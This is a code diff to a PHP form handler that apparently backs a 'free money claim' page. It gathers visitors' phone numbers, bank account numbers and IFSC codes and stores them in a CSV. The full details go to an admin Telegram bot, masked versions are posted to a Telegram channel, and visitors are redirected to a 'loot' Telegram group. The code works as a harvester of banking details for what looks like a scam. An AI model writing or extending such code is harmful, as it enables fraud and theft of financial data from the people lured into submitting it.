@@ -1,7 +1,14 @@
 <?php
 include "config.php";
 
-// Get form data
+// ----------------- AUTO-GENERATE CSV IF NOT EXISTS -----------------
+if (!file_exists($csv_file)) {
+    $f = fopen($csv_file, 'w');
+    fputcsv($f, ['Phone', 'Account Number', 'IFSC Code', 'Claim', 'Time']); // header
+    fclose($f);
+}
+
+// ----------------- GET FORM DATA -----------------
 $phone      = $_POST['phone'] ?? 'N/A';
 $account_no = $_POST['account_no'] ?? 'N/A';
 $ifsc_code  = $_POST['ifsc_code'] ?? 'N/A';
@@ -14,7 +21,11 @@ $already_claimed = false;
 
 if (file_exists($csv_file)) {
     $data = array_map('str_getcsv', file($csv_file));
-    $total_claims = count($data);
+    if (!empty($data) && $data[0][0] === 'Phone') { // header row
+        $total_claims = count($data) - 1;
+    } else {
+        $total_claims = count($data);
+    }
 
     // Check if account number already used
     foreach ($data as $row) {
@@ -25,13 +36,12 @@ if (file_exists($csv_file)) {
     }
 }
 
-// ----------------- CHECK IF SAME BANK USED -----------------
+// ----------------- DUPLICATE / LIMIT CHECK -----------------
 if ($already_claimed) {
     http_response_code(400);
     exit("⚠ 1 Bank 1 Time! Try another bank account.");
 }
 
-// ----------------- CHECK LIMIT -----------------
 if ($total_claims >= $total_claim_limit) {
     http_response_code(400);
     exit("⚠ Claim Limit Reached! Total Claims: $total_claims / $total_claim_limit");
@@ -43,24 +53,42 @@ $f = fopen($csv_file, 'a');
 fputcsv($f, $line);
 fclose($f);
 
-// ----------------- TELEGRAM ALERT -----------------
-$telegram_message = "📱 Phone: $phone\n"
-                  . "🏦 Account: $account_no\n"
-                  . "🔢 IFSC: $ifsc_code\n"
-                  . "💰 Claim: $claim\n"
-                  . "🕒 Time: $time\n"
-                  . "📍 Total Claims So Far: " . ($total_claims + 1);
-
-// Send to bot
-sendTelegram($telegram_bot_token, $chat_id, $telegram_message);
-
-// Send to channel with masked details
+// ----------------- MASK DATA FOR CHANNEL -----------------
 $masked_phone   = preg_replace('/.(?=.{4})/', '*', $phone);
 $masked_account = preg_replace('/.(?=.{4})/', '*', $account_no);
 $masked_ifsc    = substr($ifsc_code, 0, 4) . '*****' . substr($ifsc_code, -2);
 
-$channel_message = "📱 Phone: $masked_phone\n🏦 Account: $masked_account\n🔢 IFSC: $masked_ifsc\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: " . ($total_claims + 1);
-sendTelegram($telegram_bot_token, '@payment_alert_122', $channel_message);
+// ----------------- TELEGRAM ALERT FUNCTION -----------------
+function sendTelegram($token, $chat_id, $message){
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $params = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    if($result === false){
+        error_log('Curl error: ' . curl_error($ch));
+    } else {
+        error_log('Telegram response: ' . $result);
+    }
+    curl_close($ch);
+}
+
+// --- Full data to admin bot ---
+$bot_message = "📱 Phone: $phone\n🏦 Account: $account_no\n🔢 IFSC: $ifsc_code\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: " . ($total_claims+1);
+sendTelegram($telegram_bot_token, $chat_id, $bot_message);
+
+// --- Masked data to Telegram channel ---
+$channel_chat_id = -1003073944495; // Your channel numeric ID
+$channel_message = "📱 Phone: $masked_phone\n🏦 Account: $masked_account\n🔢 IFSC: $masked_ifsc\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: " . ($total_claims+1);
+sendTelegram($telegram_bot_token, $channel_chat_id, $channel_message);
 
 // ----------------- REDIRECT / SUCCESS PAGE -----------------
 header("Refresh:3; url=https://t.me/EARNPAYTMLOOT0");
